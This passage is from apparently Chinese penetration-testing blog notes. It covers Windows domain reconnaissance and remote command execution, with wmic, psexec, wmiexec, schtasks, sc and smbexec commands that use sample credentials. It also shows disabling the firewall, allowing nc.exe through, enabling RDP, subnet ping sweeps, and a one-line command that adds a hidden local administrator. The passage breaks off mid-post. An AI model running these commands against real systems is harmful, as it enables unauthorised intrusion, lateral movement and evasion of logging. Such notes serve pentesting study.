<p>查看补丁列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173416455.png" alt="补丁列表"></p>
<p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的通过查看本机的补丁列表，就可以找到为打补丁的漏洞。</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173519555.png" alt="补丁"></p>
<p>使用wmic命令查看安装在系统中的补丁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320173846237.png" alt="更新补丁"></p>
<p>查看本机共享列表和可访问的域共享列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320174007610.png" alt="共享列表"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320174108057.png" alt="wmic共享列表"></p>
<p>查询路由表及所有可用接口的ARP（地址解析协议）缓存表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320203520428.png" alt="路由表"></p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320203601604.png" alt="arp缓存表"></p>
<p>查询防火墙相关配置</p>
<ul>
<li><p>关闭防火墙（管理员权限）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span>  <span class="comment"># win server 2003及之前的版本</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment"># win server 2003之后版本</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看防火墙配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改防火墙配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win server 2003及之前版本，允许指定程序全部连接</span></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">"allow nc"</span> <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># win server 2003之后版本</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"pass nc"</span> dir <span class="keyword">in</span> action=allow program=<span class="string">"c:\nc.exe"</span>  <span class="comment"># 允许指定程序进入</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Allow nc"</span> dir=out action=allow program=<span class="string">"c:\nc.exe"</span>  <span class="comment"># 允许指定程序退出</span></span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Remote Desktop"</span> protocol=TCP dir=<span class="keyword">in</span> localport=3389 action=allow  <span class="comment"># 允许3389端口放行</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>自定义防火墙日志的存储位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">"c:\windows\temp\fw.log"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>查看代理配置情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span>   <span class="comment"># 可以看到服务器127.0.0.1的1080端口的代理配置信息</span></span><br></pre></td></tr></table></figure>

<img src="/posts/12754/images\image-20200320210146225.png" alt="image-20200320210146225" style="zoom:80%;">

<p>查询并开启远程连接服务</p>
<ul>
<li><p>查看远程连接端口</p>
<p>在命令行环境中执行注册表查询语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REG QUERY <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /V PortNumber</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200320210727867.png" alt="远程端口"></p>
<p>连接的端口为0xd3d，转换后为3389</p>
</li>
<li><p>在Windows server 2003中开启3389</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting <span class="built_in">where</span> (_CLASS !=<span class="string">""</span>) callsetallowtsconnections 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>在Windows server 2008和Windows server 2012中开启3389</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic/namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="built_in">where</span> (_CLASS !=<span class="string">""</span>) call setallowsconnections 1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmic/namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="built_in">where</span> (TerminalName=<span class="string">'RDP-Tcp'</span>) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER"</span> /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ol>
<h3 id="自动收集信息"><a href="#自动收集信息" class="headerlink" title="自动收集信息"></a>自动收集信息</h3><p>为了简化操作，可以创建一个脚本，在目标机器上述完成流程、服务、用户账号、用户组、网络接口、硬盘信息、网络共享信息、操作系统、安装补丁、安装软件、启动时运行的程序、时区等信息的查询工作。</p>
<p>推荐使用利用<code>WMIC</code>收集目标信息。在默认情况下，任何版本的Windows XP的低权限用户不能访问wmic，Windows 7以上版本的低权限用户允许访问wmic并执行相关查询操作。</p>
<p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a> 执行该脚本后会将所有结果写入一个 html 文件。</p>
<img src="/posts/12754/images\image-20200321150034222.png" alt="image-20200321150034222" style="zoom:80%;">

<h3 id="Empire下主机信息收集"><a href="#Empire下主机信息收集" class="headerlink" title="Empire下主机信息收集"></a>Empire下主机信息收集</h3><p>Empire提供了用于收集主机信息的模块。输入命令<code>usemodule situational_awareness/host/winenum</code>，即可查看本机用户、域成员、密码设置时间、剪切板内容、系统基本信息、网络适配器信息、共享信息等。</p>
<p>另外，<code>situational_awareness/host/winenum</code>模块激活包含了系统中所有有用的信息，例如目标主机事件日志、应用程序控制策略日志，包含RDP登录信息、powershell脚本运行和保存的信息等。</p>
<p><strong>运行这个模块需要管理员权限。</strong></p>
<h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><ol>
<li><p>查看当前权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p>本地普通用户（commando本机的fireeye用户）</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321150415512.png" alt="image-20200321150415512"></p>
<p>本地管理员用户（win-nmcuole3s38本机的administrator用户）</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321151122737.png" alt="image-20200321151122737"></p>
<p>域内用户（test域内administrator用户）</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321150920756.png" alt="image-20200321150920756"></p>
<p>如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无需额外输入账号密码。</p>
<p>本地管理员administrator权限可以直接提升为Ntauthority或system权限，因此在域中，除普通用户外，所以的机器都有一个机器用户（用户名是机器名+$）。在本质上，机器的system用户对应的就是域里面的机器用户。所以使用system权限可运行域内的查询命令。</p>
</li>
<li><p>获取域SID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<img src="/posts/12754/images\image-20200321162551515.png" alt="image-20200321162551515" style="zoom:80%;">

<p>500 为域用户administrator的SID，前面的是test域的SID</p>
</li>
<li><p>查询指定用户的详细信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure>

<img src="/posts/12754/images\image-20200321162905059.png" alt="image-20200321162905059" style="zoom:67%;">

</li>
</ol>
<h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><p>获得了本机的相关信息后，就要判断当前内网中是否存在域，如果存在，就要判断所控主机是否在域内。</p>
<ol>
<li><p>使用 ipconfig 命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<p>查看网关IP、DNSIP、域名、本机是否和DNS服务器处于同一网段</p>
<img src="/posts/12754/images\image-20200321163459590.png" alt="image-20200321163459590" style="zoom:60%;">

<p>用 nslookup 解析域名的IP地址。用解析得到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台机器上。</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321163655780.png" alt="image-20200321163655780"></p>
</li>
<li><p>查看系统详细信息</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321163851946.png" alt="image-20200321163851946"></p>
<p>”域“即域名test.com、“登录服务器”为域控制器，如果“域”为“WORKGROUP”，表示当前机器不在域内。</p>
</li>
<li><p>查询当前登录域及登录用户信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<img src="/posts/12754/images\image-20200321164309260.png" alt="image-20200321164309260" style="zoom:80%;">
</li>
<li><p>判断主域(域服务器通常会同时作为时间服务器使用)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164434781.png" alt="image-20200321164434781"></p>
<p>执行上面的命令，通常有3中情况：</p>
<ul>
<li><p>存在域，当前用户不是域用户</p>
<p>发生系统错误 5。拒绝访问。</p>
</li>
<li><p>存在域，当前用户是域用户</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164840696.png" alt="image-20200321164840696"></p>
</li>
<li><p>不存在域</p>
<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200321164821261.png" alt="image-20200321164821261"></p>
</li>
</ul>
</li>
</ol>
<h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="利用NetBIOS快速探测内网"><a href="#利用NetBIOS快速探测内网" class="headerlink" title="利用NetBIOS快速探测内网"></a>利用NetBIOS快速探测内网</h3><p>NetBIOS是局域网程序使用的一种应用程序编程接口，为程序提供了请求低级服务的统一的命令集，为局域网提供了网络及其他特殊功能。NetBIOS也是计算机的命名标识，主要用于局域网中计算机的互访。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此<strong>推荐使用</strong>。</p>
<p>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。有Windows和Linux两个版本，体积很小，不需要安装特殊的库或DLL就能使用。</p>
<p>将其上传的目标上，然后直接输入IP地址范围并运行。输入<code>nbtscan.exe</code>查看帮助文档。</p>
<h3 id="利用ICMP协议快速探测内网"><a href="#利用ICMP协议快速探测内网" class="headerlink" title="利用ICMP协议快速探测内网"></a>利用ICMP协议快速探测内网</h3><p>一次对内网中的每个IP地址执行ping命令，可以快速找到内网存活主机。在渗透测试中可以探测整个C段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/12754/F:%5Cimages%5Cimage-20200322174613782.png" alt="icmp探测"></p>
<p>vbs脚本</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">strSubNet = <span class="string">"192.168.1."</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">"Scripting.FileSystemObject"</span>)</span><br><span class="line"><span class="keyword">Set</span> objTS = Objfso.CreateTextFile(<span class="string">"C:\Windows\Temp\Result.txt"</span>)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span></span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">" is alived ! :)"</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">objTS.close</span><br><span class="line">WScript.Echo <span class="string">"All Ping Scan , All Done ! :)"</span></span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer)</span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">"winmgmts:\\.\root\cimv2"</span>)</span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">"Select * From Win32_PingStatus Where Address='"</span> &amp; strComputer &amp; <span class="string">"'"</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">Ping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">Ping = <span class="literal">False</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">Exit</span> <span class="keyword">For</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>

<img src="/posts/12754/images\image-20200322181818410.png" alt="image-20200322181818410" style="zoom:80%;">

<h3 id="通过ARP扫描探测内网"><a href="#通过ARP扫描探测内网" class="headerlink" title="通过ARP扫描探测内网"></a>通过ARP扫描探测内网</h3><ol>
<li><p>arp-scan工具</p>
<p>直接把arp.exe上传到目标机器中运行，可以自定义掩码、指定扫描范围等</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp.exe -t 192.168.1.0/20</span><br></pre></td></tr></table></figure>
</li>
<li><p>Empire中的arpscan模块</p>
<p>该模块用于在局域网内发送ARP数据包、收集活跃主机的IP地址和MAC地址信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure>
</li>
<li><p>Nishang中的Invoke-ARPScan.ps1脚本</p>
<p>将脚本上传到目标机器上运行，也可以直接远程加载脚本、自定义掩码和扫描范围</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">"&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20&#125;"</span> &gt;&gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过常规TCP/UDP端口扫描探测内网</p>
<p>ScanLine是一款经典的端口扫描工具，可以在所有版本的Windows操作系统中使用，体积小，仅使用单个文件，同时支持TCP/UDP端口扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><p>注意以下几点：</p>
<ul>
<li>端口的Banner信息</li>
<li>端口上运行的服务</li>
<li>常见应用的默认端口</li>
</ul>
<h3 id="利用telnet命令进行扫描"><a href="#利用telnet命令进行扫描" class="headerlink" title="利用telnet命令进行扫描"></a>利用telnet命令进行扫描</h3>]]></content>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透远程执行命令的几种姿势</title>
    <url>/posts/35747.html</url>
    <content><![CDATA[<h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol>
<li><p>在远程系统上执行 bat 脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111! process call create c:\test.bat</span><br></pre></td></tr></table></figure></li>
<li><p>在远程系统上执行单条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.72.10 &#x2F;user:administrator &#x2F;password:L111111 process call create &quot;cmd.exe &#x2F;c net user test1 !@#123QWE &#x2F;add &amp;&amp; net localgroup administrators test1 &#x2F;add</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h3><ol>
<li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
<li>远程系统的本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li>
<li>wmic 会以管理员权限在远程系统上执行命令</li>
<li>防火墙开启将无法连接</li>
<li>如果报错 “Invalid Global Switch” ，用双引号把包含-的结点括起来即可正常执行。</li>
</ol>
<h2 id="0x01-psexec"><a href="#0x01-psexec" class="headerlink" title="0x01 psexec"></a>0x01 psexec</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>psexec针对远程建立连接的认证方式有两种，一种先建立 ipc 连接，然后直接用 <code>psexec \\192.168.72.10 cmd</code> 命令开启一个半交互式的cmdshell，另一种是在psexec的参数中指定账号密码。</p>
<p><img src="/posts/35747/11.png" alt></p>
<p><img src="/posts/35747/12.png" alt></p>
<h3 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h3><ol>
<li>通过ipc连接，释放psexesvc.exe到目标</li>
<li>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</li>
<li>客户端连接执行命令,服务端启动相应的程序并执行回显数据</li>
</ol>
<h3 id="工具说明-1"><a href="#工具说明-1" class="headerlink" title="工具说明"></a>工具说明</h3><p><strong>注意：</strong></p>
<ol>
<li>目标主机第一次运行时，会出现弹框提示。<br>解决办法：先执行 <code>psexec /accepteula</code> 即可避免。</li>
<li>运行完之后记得删除服务。这个在日志中会有记录，而且在少数情况下会出现服务删除不成功！！！<br>所以一般不用它。</li>
<li>需要远程系统开启 ADMIN$ 共享</li>
<li>建立 ipc 连接后可以不指定用户名和密码</li>
</ol>
<h2 id="0x02-WMIEXEC"><a href="#0x02-WMIEXEC" class="headerlink" title="0x02 WMIEXEC"></a>0x02 WMIEXEC</h2><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。<br><img src="/posts/35747/21.png" alt><br>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p>
<p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
<p><strong>半交互式shell模式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell IP username password</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/22.png" alt></p>
<p><strong>单个命令执行的模式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd IP username password &quot;command&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/35747/23.png" alt></p>
<h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ password &#x2F;user:username</span><br></pre></td></tr></table></figure>
<p>拷贝文件到远程系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 文件 \\目标IP\c$</span><br></pre></td></tr></table></figure>
<p>查看远程主机当前时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP</span><br></pre></td></tr></table></figure>
<p>添加计划任务在远程系统上执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 cmd.exe &#x2F;c &quot;ipconfig &#x2F;all &gt;c:ip.log&quot;</span><br></pre></td></tr></table></figure>
<p>添加计划任务在远程系统上执行bat脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 时间 c:test.bat</span><br></pre></td></tr></table></figure>
<p>查看at任务列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP</span><br></pre></td></tr></table></figure>
<p>删除at计划任务，运行完成后一定要删除计划任务！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\目标IP 1 &#x2F;delete</span><br></pre></td></tr></table></figure>
<p>查看所有ipc连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>
<p>删除指定ipc连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\目标IP\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>
<p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure>

<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
<p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr c:\programdata\test.bat &#x2F;ru system &#x2F;f</span><br></pre></td></tr></table></figure>
<p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn test &#x2F;sc onstart &#x2F;tr &quot;cmd.exe &#x2F;c whoami &#x2F;all &gt;&gt; c:\programdata\error.log&quot; &#x2F;ru  workgroup\administrator&quot;</span><br></pre></td></tr></table></figure>
<p>查看建立的计划任务是否正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; | findstr test</span><br></pre></td></tr></table></figure>
<p>运行建立的计划任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;run &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;i &#x2F;tn &quot;test&quot;</span><br></pre></td></tr></table></figure>
<p>删除建立的计划任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.17.138 &#x2F;u workgroup\administrator &#x2F;p &quot;!@#123QWE&quot; &#x2F;tn &quot;test&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
<p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p>
<h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 create test binpath&#x3D; &quot;cmd.exe &#x2F;c start c:\programdata\test.bat&quot;</span><br></pre></td></tr></table></figure>
<p>开启服务，运行其它命令可以直接修改 bat 脚本内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 start test</span><br></pre></td></tr></table></figure>
<p>删除服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.17.138 delete test</span><br></pre></td></tr></table></figure>

<h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p>
<h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy execserver.exe \\192.168.17.138\c$\windows</span><br></pre></td></tr></table></figure>
<p>在远程系统上执行单条命令(以管理员权限执行命令)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
<p>在远程系统上执行单条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 test !@#123QWE &quot;whoami &#x2F;all&quot; c$</span><br></pre></td></tr></table></figure>
<p>在远程系统上执行 bat 脚本(以管理员权限执行命令)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$</span><br></pre></td></tr></table></figure>
<p>删除远程系统上的 execserver.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del \\192.168.17.138\c$\windows\execserver.exe</span><br></pre></td></tr></table></figure>

<h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令</p>
